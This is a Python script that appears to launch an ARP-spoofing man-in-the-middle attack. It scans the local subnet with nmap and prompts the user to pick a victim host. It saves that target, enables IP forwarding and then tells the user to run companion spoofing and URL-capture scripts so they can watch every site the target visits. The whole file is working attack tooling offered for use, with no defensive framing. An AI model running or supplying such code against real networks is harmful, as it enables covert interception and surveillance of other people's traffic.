from subprocess import *
from sys import exit
import os

print("Scanning Wlan...")
target = ""
a = os.popen("nmap -sn 192.168.1.0/24").read()
ips = []
ossys = []
data = {}
for i in a.split("\n"):
	if i.find("report for") != -1 or i.find("MAC") != -1:
		if i.find("report for") != -1:
			ips.append(i.replace("Nmap scan report for ",""))
		else:
			ossys.append(i[31:])

for a,b in zip(ips,ossys):
	data[a] = b


for z in data:
	print("IP " + z + " Found. Os Is " + data[z])
	x = input("Was It Your Target? ")
	x = x.lower()
	if x == "y" or x == "yes":
		target = z
		break
	else:
		pass
if target == "":
	print("I Cant Find Another target!!!")
	exit()
	
f = open("spoof/target","w")
f.write(target)
f.close()

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

print("""
\x1b[41m_______________________________________________________________________________________________________________\x1b[49m\x1b[36m
Now You Should Open 3 Terminals.(In Current Path[for this work do right-click then click open terminal])
After That You NeedTo Execute These Commands One By One.First In Terminal1 Type:
\x1b[92mpython3 arpspoof1.py\x1b[36m
And In Terminal2 Type:
\x1b[92mpython3 arpspoof2.py\x1b[36m
And In Last Terminal Type:
\x1b[92mmpython3 geturls.py\x1b[36m
Now In Third Terminal You Can See All Sites That Target Is Going.
\x1b[41m_______________________________________________________________________________________________________________\x1b[49m\x1b[39m

""")
